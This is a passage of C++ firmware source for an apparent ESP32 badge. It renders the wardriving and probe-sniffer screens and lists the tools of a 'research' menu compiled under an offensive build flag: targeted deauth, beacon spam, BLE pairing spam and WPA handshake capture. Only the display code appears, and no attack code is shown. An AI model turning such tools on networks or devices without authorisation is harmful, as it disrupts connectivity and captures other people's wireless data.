                drawTitle(d, x, y, "Wardrive");
                if (scanErr) {
                    d->drawString(x + 2, ry, scanErr);
                    drawFooter(d, x, y, "*: back");
                    break;
                }
                snprintf(b, sizeof(b), "APs logged: %d", g_wdCount);
                d->drawString(x + 2, ry, b);
                d->drawString(x + 2, ry + lh, "-> /badge/wardrive.csv");
                d->drawString(x + 2, ry + 2 * lh, "GPS: none (no coords)");
                d->drawString(x + 2, ry + 3 * lh, "get it via Badge WiFi");
                drawFooter(d, x, y, "scanning all ch   *: stop");
                break;
            }
            drawTitle(d, x, y, "Probe sniffer");
            if (scanErr) {
                d->drawString(x + 2, ry, scanErr);
                drawFooter(d, x, y, "*: back");
                break;
            }
            Probe local[5];
            int ln = 0, total;
            portENTER_CRITICAL(&g_probeLock);
            total = g_nProbes;
            int startI = total > 5 ? total - 5 : 0;
            for (int i = startI; i < total && ln < 5; i++)
                local[ln++] = g_probes[i];
            portEXIT_CRITICAL(&g_probeLock);
            if (total == 0)
                d->drawString(x + 2, ry, isWifiAvailable() ? "Mesh WiFi ON - turn off" : "listening (ch hop)...");
            for (int i = 0; i < ln; i++) {
                char nm[20];
                snprintf(nm, sizeof(nm), "%s", local[i].ssid);
                snprintf(b, sizeof(b), "%-18s %d", nm, local[i].rssi);
                d->drawString(x + 2, ry + i * lh, b);
            }
            snprintf(b, sizeof(b), "%d SSIDs  ch%d  *: stop", total, hopCh);
            drawFooter(d, x, y, b);
            break;
        }
        }
        d->setColor(WHITE);
    }
};

const char *const ResearchApp::TOOLS[ResearchApp::NUM_TOOLS] = {
    "Back",           "Targeted deauth", "Beacon spam",    "BLE pairing spam",
    "Probe sniffer",  "Handshake grab",  "Packet monitor", "Wardrive"};

static ResearchApp *researchAppInst()
{
    static ResearchApp *p = psramNew<ResearchApp>();
    return p;
}

void openResearch()
{
    appOpen(researchAppInst());
}

} // namespace badge

#endif // BADGE_OFFENSIVE
